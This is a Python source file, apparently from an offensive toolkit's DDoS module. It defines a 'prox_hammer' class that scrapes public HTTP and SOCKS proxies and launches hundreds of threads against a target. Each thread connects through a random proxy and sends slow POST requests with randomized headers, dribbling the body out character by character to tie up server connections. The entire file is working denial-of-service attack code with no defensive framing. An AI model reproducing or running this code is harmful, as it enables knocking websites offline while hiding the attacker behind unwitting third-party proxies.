from bane.ddos.utils import *

class prox_hammer(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        threads_daemon=True,
        scraping_timeout=15,
        max_content=15000,
        min_content=10000,
        threads=700,
        timeout=5,
        http_list=None,
        socks4_list=None,
        socks5_list=None,
        duration=60,
        logs=True,
    ):
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.httplist = http_list
        if not self.httplist and self.httplist != []:
            self.httplist = proxyscrape(timeout=scraping_timeout)
        self.socks4list = socks4_list
        if not self.socks4list and self.socks4list != []:
            self.socks4list = proxyscrape(protocol='socks4',timeout=scraping_timeout)
        self.socks5list = socks5_list
        if not self.socks5list and self.socks5list != []:
            self.socks5list = proxyscrape(protocol='socks5',timeout=scraping_timeout)
        self.stop = False
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.max_content = max_content
        self.min_content = min_content
        self.logs = logs
        self.counter = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    bot_type = []
                    if len(self.httplist) > 0:
                        bot_type.append("h")
                    if len(self.socks4list) > 0:
                        bot_type.append("s4")
                    if len(self.socks5list) > 0:
                        bot_type.append("s5")
                    z = random.choice(bot_type)
                    if z == "h":
                        line = random.choice(self.httplist)
                    elif z == "s4":
                        line = random.choice(self.socks4list)
                    elif z == "s5":
                        line = random.choice(self.socks5list)
                    ipp = line.split(":")[0].split("=")[0]
                    pp = line.split(":")[1].split("=")[0]
                    s = socks.socksocket()
                    if z == "h":
                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                    elif z == "s4":
                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                    elif z == "s5":
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                    if z == "h":
                        s.settimeout(self.timeout)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    q = random.randint(self.min_content, self.max_content)
                    ck = ""
                    if self.cookie:
                        ck = "Cookie: " + self.cookie + "\r\n"
                    s.send(
                        reorder_headers_randomly(
                            "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(
                                random.choice(paths),
                                ck,
                                random.choice(self.user_agents),
                                random.randint(300, 1000),
                                q,
                                (
                                    random.choice(referers)
                                    + random.choice(lis)
                                    + str(random.randint(0, 100000000))
                                    + random.choice(lis)
                                ),
                                self.target,
                            )
                        ).encode("utf-8")
                    )
                    for i in range(q):
                        if (
                            int(time.time() - self.start) >= self.duration
                        ):  # this is a safety mechanism so the attack won't run forever
                            break
                        if self.stop == True:
                            break
                        h = random.choice(lis)
                        try:
                            s.send(h.encode("utf-8"))
                            if self.logs == True:
                                sys.stdout.write("\rPosted: {} --> {}".format(h, ipp))
                                sys.stdout.flush()
                                # print("Posted: {} --> {}".format(h,ipp))
                            time.sleep(random.uniform(0.1, 3))
                        except:
                            break
                    s.close()
                except:
                    pass
                self.counter -= 1
                time.sleep(0.1)
            self.kill()
        except:
            pass
